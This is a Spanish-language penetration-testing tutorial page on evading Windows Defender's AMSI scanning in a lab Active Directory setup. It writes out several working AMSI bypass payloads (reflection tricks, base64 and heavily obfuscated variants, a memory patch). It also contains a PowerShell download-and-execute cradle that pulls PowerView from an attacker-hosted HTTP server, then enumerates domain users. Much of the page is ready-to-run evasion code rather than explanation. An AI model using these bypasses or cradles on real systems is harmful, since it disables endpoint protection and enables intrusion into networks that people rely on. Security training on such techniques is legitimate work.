---
icon: hourglass-clock
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Evasión de detección en tiempo real

Si en vez de pasarle un binario, lo que queremos es que ejecute un script de `PowerShell` por ejemplo, podremos hacerlo de tal forma que no salte el antivirus y poder crearnos nuestra `reverse shell`.

Si nos vamos a la `suite` de `powersploit` como hemos comentado en temas anteriores:

```shell
powersploit
```

Info:

```
> powersploit ~ PowerShell Post-Exploitation Framework

/usr/share/windows-resources/powersploit
├── AntivirusBypass
├── CodeExecution
├── Exfiltration
├── Mayhem
├── Persistence
├── PowerSploit.psd1
├── PowerSploit.psm1
├── Privesc
├── README.md
├── Recon
├── ScriptModification
└── Tests
```

Tendremos diferentes scripts que podremos encontrarnos en esa ruta que nos marca para poder realizar lo que comentaba anteriormente.

```shell
cd /usr/share/windows-resources/powersploit
```

Pero el que nos interesa esta en `Recon/Powervire.ps1` como vimos anteriormente en temas anteriores en `Active Directory`.

Vamos a encender nuestra maquina `DC01` y ahora vamos a irnos a la maquina `WS02` abriremos un `PowerShell` y ejecutaremos el siguiente comando para que coja el `.ps1` y lo ejecute seguidamente.

> Maquina atacante

```shell
python3 -m http.server 80
```

> Maquina victima

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://192.168.5.205/PowerView.ps1")
```

Info:

```
IEX : En línea: 1 Carácter: 1
+ #requires -version 2
+ ~~~~~~~~~~~~~~~~~~~~
Este script contiene elementos malintencionados y ha sido bloqueado por el software antivirus.
En línea: 1 Carácter: 1
+ IEX (New-Object Net.WebClient).DownloadString("http://192.168.5.205/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

Vemos que nos pone que puede ser un `malware` por lo que nos lo esta bloqueando nuestro antivirus, ya que por lo menos el antivirus de `Microsoft` tiene un modulo llamado `amsi` el cual parchea esas firmas maliciosas y bloquea la ejecuccion o el binario que contiene dentro de ese modulo.

Para poder `Bypassear` este tipo de firmas y que el antivirus no lo detecte tendremos que estar muy al dia para poder ver las nuevas vulnerabilidades que puede salir para poder `bypassear` esto, ya que cuando salgan dichas vulnerabilidades `Microsoft` u otras empresas pondran el parche de las mismas, por lo que tendremos un tiempo reducido para aprovecharlas, pero hay una pagina con una tecnica que presento un investigador llamado `Matt Graeber` que es la siguiente:

URL = [Pagina de Matt Graeber amsi Bypass](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)

El investigador se dio cuenta de que si en el codigo a ejecutar en `PowerShell` contenia la palabra `amsiInitFailed` en `true` no cargaba el analizador de firmas de `Windows Defender` y no lo escaneaba, por lo que `bypassearia` esas confirmaciones de firmas del modulo de `amsi`.

Por lo que se podria ejecutar cualquier script sin que fuera detectado por el `Windows Defender`.

Es este codigo de aqui:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

En versiones anteriores de `Windows` funciona, pero como esta vulnerabilidad salio muy famosa, ya esta bloqueado en versiones mas actuales, ya que si lo intentamos ejecutar pondria lo siguiente:

```
En línea: 1 Carácter: 1
+ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetF ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Este script contiene elementos malintencionados y ha sido bloqueado por el software antivirus.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Pero vino otro investigador y dio la solucion de en vez de poner todo ese comando en texto plano, codificarlo en `base64` de la siguiente forma:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

Esto a dia de hoy funciona, en tal caso de que lo siguiera bloqueando se puede ofuscar un poco mas el codigo para poder `bypassear` dicha firma que se pueda ejecutar esto mismo.

Por ejemplo este otro codigo:

URL = [GitHub del codigo](https://github.com/cybersectroll/TrollAMSI)

```powershell
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)
```

Y si ahora sin que nos de ningun error probamos a ejecutar de nuevo el siguiente comando:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://192.168.5.205/PowerView.ps1")
```

Vemos que efectivamente nos deja y no nos bloquea absolutamente nada.

Por lo que vamos a probarlo de la siguiente forma:

```powershell
Get-NetUser | select name
```

Info:

```
name
----
Administrator
Guest
krbtgt
empleado1
empleado2
Maurine Bibby
Henrie Kaleena
Ali Alix
Saree Dayna
Lonnie Betti
Abbi Jocelyn
Arlie Gunilla
Adorne Bridgette
Roanna Bidget
Aubry Carolan
Ermina Hatti
Angelika Shelly
Barby Min
Jannel Emalia
Audre Maible
Kizzie Kacy
Andreana Shea
Emeline Shirline
Brynne Kenon
Myrtia Agatha
Ernaline Lowell
Gerri Kathi
Goldarina Nicki
Avril Cheri
Bobette Glenn
Joanie Karine
Gwenneth Gilly
Saidee Kaye
Cynthie Rori
Cristabel Melony
Mela Jacquetta
Jennifer Gerry
Ginevra Michel
Arabella Norry
Colly Katey
Marsha Jordan
Britni Henrieta
Alejandrina Faye
Philis Bertha
Harriett Daron
Ardine Farra
Robena Prudence
Pearl Judye
Riva Nellie
Jobina Aleta
Fayina Hyacinth
Loretta Jerrine
Peta Adelind
Ophelie Odele
Cybil Alica
Shay Siana
Halette Martelle
Audrey Hedwiga
Betsey Stephine
Demetris Daveta
Lexy Rosaline
Ilyssa Nevsa
Denice Freda
Georgia Marie-Ann
Benny Alikee
Sandye Leodora
Germain Gavrielle
Milicent Gracie
Meg Carolee
Linn Evaleen
Mirna Annice
Diana Sharai
Deeann Amalita
Kettie Shanta
Estelle Kelli
Guenna Jessi
Allissa Lezlie
Crissie Deena
Olga Rhoda
Anna Costanza
Corie Josie
Evy Britta
Jaime Luise
Gennifer Cleo
Colly Elfie
Gill Kellie
Carmon Leoine
Farrand Inna
Donnie Lari
Millie Hanny
Sarita Alisha
Rycca Jacinta
Levin Bab
Celle Sherye
Chloris Ilysa
Kelley Happy
Darsey Jasmine
Ebba Nicoline
Geneva Lorrin
Joellyn Pippa
Renelle Jacynth
Sarah Rhoda
Annice Mable
Aimil Evangelia
MailSrvc
```

Y por lo que vemos funciona correctamente la herramienta.

Tambien se descubrio que habia otra forma de poder evadir este tipo de `amsi` con las siguiente lienas:

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
```

Lo que esta haciendo aqui es forzar un error y esa variable se establecia en `true` quedando ese modulo desactivado, pero a dia de hoy ya te lo bloquea.

Pero llego otro investigador y creo una aplicacion que es la siguiente:

URL = [amsi.fail Pagina](https://amsi.fail)

Lo que hace esto es que cada vez que le damos a generar nos genera el mismo comando anterior pero de forma ofuscada, pero va cambiando la forma de ofuscarlo cada vez que pulsamos, por lo que podremos `bypassear` esa firma de `windows`, por ejemplo si le damos una vez a generar a mi me genero este codigo:

```powershell
$o1XOo_au6zlBn_AI=$null;$tK2D_zyBfxhkVHI=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+4250-4250));$uwiiheyxryrusrapee="+('b'+'ú').nORmALiZe([cHaR]([bYtE]0x46)+[CHar](111)+[CHar]([byTe]0x72)+[CHAr](109+23-23)+[chAr](41+27)) -replace [chAR](92)+[CHar]([Byte]0x70)+[chAr]([bYtE]0x7b)+[char](77)+[CHAR]([BYTE]0x6e)+[Char](125)";[Threading.Thread]::Sleep(882);[Ref].Assembly.GetType("System.$([CHar](77)+[chAr]([BYTE]0x61)+[chaR]([Byte]0x6e)+[chAr]([bytE]0x61)+[CHAr](46+57)+[CHAR](101+32-32)+[CHAr](34+75)+[CHAR](101*43/43)+[ChaR]([ByTE]0x6e)+[ChAr](116*67/67)).$([char](65+35-35)+[chAR]([byTe]0x75)+[chAR](116+36-36)+[char](111)+[chaR](109*11/11)+[chaR](97)+[ChAr]([bYTe]0x74)+[chAR](105*75/75)+[CHaR](111+43-43)+[chAR]([bYTe]0x6e)).$(('Àms'+'íÚt'+'íls').noRMalIzE([cHAR](70*34/34)+[char](111)+[cHAR]([byTE]0x72)+[chAR]([bYte]0x6d)+[ChAR]([ByTe]0x44)) -replace [char](92+53-53)+[CHaR](82+30)+[CHar](100+23)+[Char](77+58-58)+[CHAr]([BYtE]0x6e)+[ChAr]([bytE]0x7d))").GetField("$(('àms'+'îSê'+'ssî'+'õn').nORMaLIze([cHar]([bYtE]0x46)+[char]([Byte]0x6f)+[cHar]([BYTe]0x72)+[cHAr]([byTE]0x6d)+[ChAR](68*52/52)) -replace [ChAr]([BYtE]0x5c)+[cHAr]([ByTe]0x70)+[CHAR](123*79/79)+[char](77)+[chAR](110)+[chAR]([bYte]0x7d))", "NonPublic,Static").SetValue($o1XOo_au6zlBn_AI, $o1XOo_au6zlBn_AI);[Ref].Assembly.GetType("System.$([CHar](77)+[chAr]([BYTE]0x61)+[chaR]([Byte]0x6e)+[chAr]([bytE]0x61)+[CHAr](46+57)+[CHAR](101+32-32)+[CHAr](34+75)+[CHAR](101*43/43)+[ChaR]([ByTE]0x6e)+[ChAr](116*67/67)).$([char](65+35-35)+[chAR]([byTe]0x75)+[chAR](116+36-36)+[char](111)+[chaR](109*11/11)+[chaR](97)+[ChAr]([bYTe]0x74)+[chAR](105*75/75)+[CHaR](111+43-43)+[chAR]([bYTe]0x6e)).$(('Àms'+'íÚt'+'íls').noRMalIzE([cHAR](70*34/34)+[char](111)+[cHAR]([byTE]0x72)+[chAR]([bYte]0x6d)+[ChAR]([ByTe]0x44)) -replace [char](92+53-53)+[CHaR](82+30)+[CHar](100+23)+[Char](77+58-58)+[CHAr]([BYtE]0x6e)+[ChAr]([bytE]0x7d))").GetField("$(('ã'+'m'+'s'+'ì'+'C'+'ô'+'n'+'t'+'è'+'x'+'t').nOrMalizE([CHar](70+26-26)+[ChAR](111*40/40)+[Char]([bYTE]0x72)+[chAr](13+96)+[ChAR](68+35-35)) -replace [CHAr]([bYTe]0x5c)+[CHAR]([byTE]0x70)+[cHaR]([ByTE]0x7b)+[CHAR]([byte]0x4d)+[CHAR]([BYtE]0x6e)+[cHaR]([BYTE]0x7d))", "NonPublic,Static").SetValue($o1XOo_au6zlBn_AI, [IntPtr]$tK2D_zyBfxhkVHI);$eypibgevvbsp="+[ChaR]([byTe]0x77)+[Char]([Byte]0x66)+[chaR](121+13-13)+[ChaR]([Byte]0x6f)+[CHAR](113)+[chaR](116+35-35)+[ChAR]([bYTE]0x76)+[CHar](122*25/25)+[cHAr](101+94-94)+[CHar]([BYtE]0x64)+[cHAR]([bYte]0x6c)+[chaR](119*6/6)+[CHar](76+43)+[CHAr](103)+[chAr]([byTE]0x72)+[Char](114+12-12)+[CHAr](118+20-20)";[Threading.Thread]::Sleep(818)
```

Esto si lo ejecutamos no nos dara ningun error y abremos desactivado el modulo de `amsi`.
